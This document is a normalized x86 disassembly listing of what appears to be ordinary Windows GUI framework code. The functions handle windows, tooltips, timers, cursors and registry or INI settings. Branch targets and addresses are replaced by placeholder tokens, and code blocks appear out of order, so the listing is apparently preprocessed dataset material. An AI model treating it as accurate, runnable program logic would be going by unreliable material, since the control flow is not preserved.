lea esi [ ebp - 0x10 ]
or [ ebx + 0x24 ] 0xffffffff
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] eax
movsd [ edi ] [ esi ]
sub_44a7d2
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
mov esi ecx
push eax
call [ SetRectEmpty@IAT ]
mov eax [ esi + 0x64 ]
mov ecx esi
and eax 0xa000
neg eax
sbb eax eax
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44be6a
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
pop esi
add [ eax ] ecx
mov ecx [ ebp - 0xc ]
add [ eax + 0x4 ] ecx
cmp [ rw-data ] 0x40047
mov ecx [ eax + 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
add [ eax + 0xc ] ecx
leave
retn 0x8
add ecx 0xfffffffe
mov [ eax + 0x4 ] ecx
sub_44a833
push esi
mov esi ecx
xor eax eax
cmp [ esi + 0x1c ] eax
je r-xdata
mov [ esi + 0x84 ] 0x1
pop esi
retn 0x8
mov ecx [ esp + 0x8 ]
xor ecx [ esp + 0xc ]
test ch 0xf
je r-xdata
push 0x33
push eax
push eax
push eax
push eax
push eax
mov ecx esi
call sub_4417b0
sub_44a866
push ebx
push esi
mov esi ecx
push edi
mov edi [ esp + 0x10 ]
mov ebx [ esi + 0x64 ]
push edi
mov eax ebx
and ah 0xf0
mov [ esi + 0x64 ] eax
call sub_44b599
test bl 0x4
mov [ esi + 0x64 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
test [ edi + 0x18 ] 0x1
jne r-xdata
push 0x1
push 0x0
push [ esi + 0x1c ]
call [ InvalidateRect@IAT ]
sub_44a8e1
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor edi edi
xor ebx ebx
cmp [ rw-data ] 0x40047
mov esi ecx
jl r-xdata
mov ecx esi
call sub_43e71a
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_44163f
push edi
push 0x8800
push edi
mov ecx esi
mov ebx eax
call sub_441673
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ edx ] ecx
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
push ebx
push 0xfffffff0
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
sub_44a94d
push ebx
push ebp
push esi
push edi
xor edi edi
xor ebx ebx
cmp [ rw-data ] 0x40047
mov esi ecx
jl r-xdata
mov ecx esi
call sub_43e71a
test edi edi
mov ebp eax
je r-xdata
call sub_44163f
push edi
push 0x8800
push edi
mov ecx esi
mov ebx eax
call sub_441673
mov edi eax
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
push ebx
push 0xfffffff0
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
sub_44a99c
push esi
mov esi ecx
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x80 ] 0x0
je r-xdata
push 0x0
push [ esi + 0x78 ]
push eax
call sub_449c7a
test eax eax
je r-xdata
push eax
mov ecx esi
call sub_453c2c
sub_44a9c8
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
push [ esi + 0x8 ]
mov ecx edi
mov [ esi + 0x18 ] 0x1
call sub_449f97
and eax 0xfffbffff
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
mov ecx edi
push [ esi + 0x8 ]
call sub_449fba
pop edi
pop esi
retn 0x4
and eax 0xfffdffff
or eax 0x40000
sub_44aa06
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
push [ esi + 0x8 ]
mov ecx edi
call sub_449f97
and eax 0xffeeffff
cmp [ esp + 0xc ] 0x1
jne r-xdata
cmp [ esp + 0xc ] 0x2
jne r-xdata
or eax 0x10000
jmp r-xdata
or al 0x2
mov ecx edi
push eax
push [ esi + 0x8 ]
call sub_449fba
pop edi
pop esi
retn 0x4
or eax 0x100000
sub_44aa48
push ebp
mov ebp esp
sub esp 0x3c
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x3c ]
call sub_441c49
mov eax [ esi ]
xor edi edi
push edi
push edi
push 0x418
mov ecx esi
mov [ ebp - 0x3c ] r--data
mov [ ebp - 0x28 ] esi
call [ eax + 0xa0 ]
cmp eax edi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_440ea7
pop edi
pop esi
leave
retn 0x8
lea eax [ ebp - 0x14 ]
mov ecx esi
push eax
push [ ebp - 0x34 ]
call sub_449de6
mov eax [ ebp - 0x10 ]
test [ ebp - 0xb ] 0x1
mov [ ebp - 0x38 ] eax
jne r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
lea eax [ ebp - 0x3c ]
push edi
push eax
push 0xbd11ffff
push edi
mov ecx esi
call sub_441aa8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push edi
push eax
push 0xffffffff
push [ ebp - 0x38 ]
mov ecx esi
call sub_441aa8
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x3c ]
push [ ebp + 0x8 ]
call sub_441e0e
sub_44ab2e
push esi
push edi
mov esi ecx
xor edi edi
push edi
mov ecx [ esi + 0x1c ]
call sub_4417ff
mov eax [ esi + 0x1c ]
push edi
push [ eax + 0x1c ]
call [ ShowOwnedPopups@IAT ]
mov ecx [ esi + 0x1c ]
push 0x13
push edi
push edi
push edi
push edi
push rw-data
call sub_4417b0
pop edi
pop esi
retn
sub_44ab60
push esi
push edi
mov esi ecx
push 0x2
call sub_45565c
mov edi [ esp + 0xc ]
add [ esi + 0xa0 ] edi
mov eax [ esi + 0xa0 ]
test eax eax
jle r-xdata
push [ esi + 0xa4 ]
and [ esi + 0xa0 ] 0x0
call [ SetCursor@IAT ]
push [ rw-data ]
call [ SetCursor@IAT ]
test edi edi
jle r-xdata
push 0x2
call sub_4556cc
pop edi
pop esi
retn 0x4
cmp [ esi + 0xa0 ] 0x1
jne r-xdata
mov [ esi + 0xa4 ] eax
jmp r-xdata
sub_44ac4c
mov eax [ esp + 0x4 ]
push esi
lea esi [ ecx + 0xa8 ]
push edi
lea edi [ eax - 0xe110 ]
mov edx [ ecx ]
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov eax [ eax + edi * 4 ]
push eax
call [ edx + 0x7c ]
test eax eax
jne r-xdata
push 0x1
pop eax
pop edi
pop esi
retn 0x4
mov ecx [ esi ]
push edi
mov eax [ ecx ]
call [ eax ]
sub_44ac7f
mov eax sub_463939
call sub_42dc88
push ecx
push esi
mov esi ecx
cmp [ esi + 0x80 ] 0x0
jne r-xdata
mov ecx [ esi + 0x80 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push 0x20
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
call sub_4559ad
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x80 ] eax
sub_44acff
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0x7c ] 0x0
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push [ esi + 0x90 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WritePrivateProfileStringA@IAT ]
push [ ebp + 0x8 ]
call sub_4547e6
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn 0xc
push edi
lea eax [ ebp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push [ ebp + 0xc ]
push esi
call [ RegSetValueExA@IAT ]
push esi
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
jmp r-xdata
sub_44ad74
push ebp
mov ebp esp
cmp [ ecx + 0x7c ] 0x0
push esi
push edi
je r-xdata
push [ ecx + 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WritePrivateProfileStringA@IAT ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
call sub_454752
mov esi eax
test esi esi
jne r-xdata
call sub_4547e6
mov esi eax
test esi esi
je r-xdata
call sub_4547e6
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push esi
call [ RegDeleteKeyA@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
inc eax
push eax
push [ ebp + 0x10 ]
push 0x1
push 0x0
push [ ebp + 0xc ]
push esi
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
push esi
call [ RegDeleteValueA@IAT ]
jmp r-xdata
push esi
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_44ae14
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_44384a
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_44ae4e
sub_44ae4e
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_442578
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_4425c7
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_44af64
mov eax sub_464090
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
call sub_44b723
mov ecx [ esi + 0x6c ]
test ecx ecx
je r-xdata
push edi
mov edi [ esi + 0x74 ]
and [ esi + 0x74 ] 0x0
test edi edi
je r-xdata
push esi
call sub_44ff32
mov eax [ esi + 0x5c ]
pop edi
test eax eax
je r-xdata
mov ecx edi
call sub_44e27d
push edi
call sub_441eb2
pop ecx
call sub_453349
cmp [ eax + 0x108 ] esi
lea ecx [ eax + 0x108 ]
jne r-xdata
push eax
call sub_42ded6
pop ecx
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
and [ ecx ] 0x0
or [ eax + 0x104 ] 0xffffffff
sub_44affb
push ebp
mov ebp esp
xor eax eax
mov ecx 0x7fff
cmp [ ebp + 0xc ] eax
je r-xdata
xor edx edx
cmp [ ebp + 0x10 ] eax
je r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] eax
je r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0xc
cmp [ ebp + 0xc ] eax
je r-xdata
sub_44b02d
mov eax [ esp + 0xc ]
push esi
mov edx [ ecx ]
mov esi eax
and esi 0x2
and eax 0x1
push esi
push eax
push [ esp + 0x10 ]
call [ edx + 0xb8 ]
mov eax [ esp + 0x8 ]
pop esi
retn 0xc
sub_44b053
push esi
push edi
mov edi [ KillTimer@IAT ]
mov esi ecx
push 0xe000
push [ esi + 0x1c ]
call edi
push 0xe001
push [ esi + 0x1c ]
call edi
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esi + 0x1c ]
call [ SetTimer@IAT ]
pop edi
pop esi
retn 0x8
sub_44b089
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
pop esi
pop ebx
leave
retn 0x4
push edi
call sub_453349
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x8 ] edi
call [ GetCursorPos@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ ScreenToClient@IAT ]
mov eax [ esi ]
push 0x0
push [ ebp - 0xc ]
mov ecx esi
push [ ebp - 0x10 ]
call [ eax + 0x64 ]
test eax eax
mov [ ebp - 0x4 ] eax
jl r-xdata
or [ edi + 0x104 ] 0xffffffff
mov ecx esi
call sub_43fd7e
mov ecx esi
mov ebx eax
call sub_43fdea
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x104 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ ClientToScreen@IAT ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
call [ WindowFromPoint@IAT ]
mov edi eax
test edi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx ebx
call sub_441826
test eax eax
jne r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
push 0xe001
push [ esi + 0x1c ]
call ebx
mov eax [ ebp - 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov eax [ esi + 0x1c ]
cmp edi eax
je r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
mov eax [ edi + 0xcc ]
test eax eax
jne r-xdata
push eax
push [ esi + 0x1c ]
call ebx
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov eax 0xe000
pop edi
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
push edi
push eax
call [ IsChild@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ebx [ KillTimer@IAT ]
jl r-xdata
test eax eax
jne r-xdata
call [ GetCapture@IAT ]
push eax
call sub_43e7b3
cmp eax esi
je r-xdata
mov eax [ esi ]
push [ ebp - 0x4 ]
mov ecx esi
call [ eax + 0xdc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xcc ]
test eax eax
je r-xdata
mov edx [ eax + 0x1c ]
xor edx edx
jmp r-xdata
cmp eax edi
je r-xdata
mov eax [ eax + 0x1c ]
mov ecx eax
call sub_43fd7e
cmp eax ebx
jne r-xdata
cmp edx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_44b1f9
push esi
push edi
mov esi ecx
call sub_420960
mov edi eax
call sub_453349
mov ecx [ esp + 0xc ]
cmp ecx 0xffffffff
jne r-xdata
test [ esi + 0x60 ] 0x8
je r-xdata
and [ eax + 0x108 ] 0x0
test [ esi + 0x60 ] 0x8
je r-xdata
push 0x0
push ecx
push 0x362
mov [ eax + 0x108 ] esi
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
or [ esi + 0x60 ] 0x8
push 0xc8
push 0xe001
mov ecx esi
call sub_44b053
cmp [ eax + 0x104 ] ecx
jne r-xdata
push 0xe000
push [ esi + 0x1c ]
call [ KillTimer@IAT ]
jmp r-xdata
push 0x0
push 0xe001
push 0x375
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
and [ esi + 0x60 ] 0xfffffff7
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
pop edi
pop esi
retn 0x4
sub_44b290
push ebp
mov ebp esp
sub esp 0x44
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
call sub_43f096
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov edi [ edi + 0x4 ]
push ebx
mov ecx esi
call sub_420960
test [ esi + 0x64 ] 0x20
mov [ ebp - 0x10 ] eax
mov ebx 0x201
jne r-xdata
pop edi
pop esi
leave
retn 0x4
cmp edi 0x200
jb r-xdata
cmp edi ebx
je r-xdata
cmp edi 0xa0
jb r-xdata
cmp edi 0x209
jbe r-xdata
cmp edi 0x202
jne r-xdata
mov ecx esi
call sub_43fe5b
test eax eax
pop ebx
je r-xdata
cmp edi 0xa9
ja r-xdata
call sub_453349
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] ecx
push [ esi + 0x1c ]
call [ ScreenToClient@IAT ]
push 0x2c
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_42dc30
add esp 0xc
mov eax [ esi ]
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x44 ] 0x28
push ecx
mov ecx esi
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call [ eax + 0x64 ]
cmp [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
cmp edi ebx
jne r-xdata
push [ ebp - 0x20 ]
call sub_42ded6
pop ecx
push [ ebp + 0x8 ]
mov ecx esi
call sub_440fac
mov edi [ ebp - 0x10 ]
push [ ebp + 0x8 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0x90 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
cmp edi ebx
je r-xdata
test [ ebp - 0x3d ] 0x80
je r-xdata
mov ecx edi
call sub_43fcfb
test eax eax
mov [ ebp - 0x10 ] eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
push 0xe001
push [ esi + 0x1c ]
call [ KillTimer@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp edi 0x202
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x104 ] eax
test [ esi + 0x60 ] 0x8
jne r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
push 0xc8
push 0xe001
mov eax [ esi ]
push [ ebp - 0x4 ]
mov ecx esi
call [ eax + 0xdc ]
jmp r-xdata
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ ecx + 0x104 ]
je r-xdata
push 0x12c
push 0xe000
jmp r-xdata
mov ecx esi
call sub_44b053
jmp r-xdata
sub_44b489
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2b
mov ebx ecx
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
cmp edi 0x2f
jbe r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ ebx ]
lea ecx [ ebp + 0x10 ]
push ecx
push esi
push [ ebp + 0xc ]
mov ecx ebx
push edi
call [ eax + 0x9c ]
test eax eax
je r-xdata
cmp edi 0x39
je r-xdata
mov ecx ebx
call sub_420960
push esi
push [ ebp + 0xc ]
push edi
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
cmp edi 0x4e
mov [ ebp + 0x10 ] eax
jne r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
cmp edi 0x4e
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x8 ]
mov edx 0xfffffdf8
cmp ecx edx
mov edi 0xfffffdee
je r-xdata
cmp edi 0x111
jne r-xdata
cmp [ esi + 0x60 ] 0x0
jne r-xdata
cmp ecx edi
jne r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
cmp ecx edx
jne r-xdata
push esi
push [ ebp + 0xc ]
push 0x4e
jmp r-xdata
cmp [ ecx ] 0x0
jmp r-xdata
cmp ecx edi
jne r-xdata
mov ecx ebx
call sub_43f615
jne r-xdata
cmp [ esi + 0xb0 ] 0x0
jne r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] 0x0
sub_44b556
push esi
push edi
mov esi ecx
push 0x0
push ecx
push ecx
mov edi [ esi ]
mov ecx esp
push [ esp + 0x1c ]
call sub_426970
mov ecx esi
call [ edi + 0x64 ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x1c ]
call [ GetDlgCtrlID@IAT ]
movzx eax ax
lea ecx [ eax + 0x50000 ]
neg eax
sbb eax eax
and eax ecx
add eax 0x10000
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_44b599
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
push 0x0
push 0x46
push [ edi + 0x1c ]
call [ DefWindowProcA@IAT ]
test [ esi + 0x18 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x14 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
mov esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
sub esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
sub ebx [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
cmp ecx esi
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp eax ebx
je r-xdata
test [ edi + 0x65 ] 0x4
je r-xdata
test [ edi + 0x65 ] 0x8
je r-xdata
push eax
push ecx
sub ecx [ rw-data ]
push 0x0
lea eax [ ebp - 0x14 ]
push ecx
push eax
call [ SetRect@IAT ]
lea eax [ ebp - 0x14 ]
push 0x1
push eax
push [ edi + 0x1c ]
call [ InvalidateRect@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push esi
sub esi [ rw-data ]
push 0x0
push esi
push eax
call [ SetRect@IAT ]
lea eax [ ebp - 0x14 ]
push 0x1
push eax
push [ edi + 0x1c ]
call [ InvalidateRect@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov esi [ SetRect@IAT ]
push eax
sub eax [ rw-data ]
push ecx
push eax
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call esi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
push [ edi + 0x1c ]
call [ InvalidateRect@IAT ]
push ebx
sub ebx [ rw-data ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push ebx
push 0x0
push eax
call esi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
push [ edi + 0x1c ]
call [ InvalidateRect@IAT ]
sub_44b69a
push esi
mov esi ecx
call sub_43e71a
cmp eax 0xffffffff
jne r-xdata
test [ esi + 0x64 ] 0x10
je r-xdata
or eax eax
jmp r-xdata
push edi
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
mov edi eax
mov ecx edi
mov eax [ edi ]
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_43c8c1
pop esi
retn 0x4
xor eax eax
pop edi
push esi
lea ecx [ edi + 0x6c ]
mov [ esi + 0x6c ] edi
call sub_43cef0
sub_44b6ed
push esi
mov esi ecx
call sub_453349
cmp [ eax + 0x108 ] esi
jne r-xdata
mov ecx [ esi + 0x6c ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
mov ecx esi
call sub_43eebd
pop esi
retn
push esi
call sub_44ff32
and [ esi + 0x6c ] 0x0
sub_44b723
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx esi
call sub_43effe
pop esi
retn
call sub_4513c9
test eax eax
je r-xdata
mov ecx esi
call sub_4513b8
mov edx [ eax ]
mov ecx eax
call [ edx + 0x58 ]
pop esi
retn
sub_44b74e
push esi
mov esi ecx
call sub_4513c9
test eax eax
mov ecx esi
jne r-xdata
call sub_43fe1e
push 0x3
pop eax
call sub_43e71a
jmp r-xdata
pop esi
retn 0xc
sub_44b76f
mov eax sub_4640a4
call sub_42dc88
sub esp 0x54
push esi
mov esi ecx
push esi
lea ecx [ ebp - 0x60 ]
call sub_447621
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xc8 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x60 ]
call sub_447693
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx esi
call [ eax + 0xd8 ]
sub_44b7c1
mov eax sub_4640b8
call sub_42dc88
sub esp 0x34
push esi
mov esi ecx
push edi
push esi
lea ecx [ ebp - 0x40 ]
call sub_44756d
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push [ esi + 0x1c ]
call [ GetClientRect@IAT ]
lea eax [ ebp - 0x1c ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x1c ]
mov ecx esi
push eax
call sub_44736f
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
mov edi [ OffsetRect@IAT ]
neg eax
neg ecx
push eax
lea eax [ ebp - 0x2c ]
push ecx
push eax
call edi
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x40 ]
push eax
call sub_4471b9
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
neg eax
neg ecx
push eax
lea eax [ ebp - 0x1c ]
push ecx
push eax
call edi
lea eax [ ebp - 0x1c ]
mov ecx esi
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_44bc43
lea eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x40 ]
push eax
call sub_4471fb
push 0x0
push [ ebp - 0x3c ]
push 0x14
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
lea eax [ ebp - 0x1c ]
mov ecx esi
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_44bdf1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4475df
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44b88e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
lea eax [ ebp + 0xc ]
mov ecx esi
push eax
call sub_440551
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ rw-data ]
mov eax [ ebp + 0x8 ]
push [ rw-data ]
push [ ebp + 0x10 ]
push esi
push [ eax + 0x4 ]
call sub_440a9b
test eax eax
jne r-xdata
mov esi [ esi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0xc
mov eax [ rw-data ]
mov ecx edi
call sub_43e71a
jmp r-xdata
sub_44b8e6
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov ecx esi
call sub_43e71a
mov eax [ esi ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x64 ]
cmp eax 0xffffffff
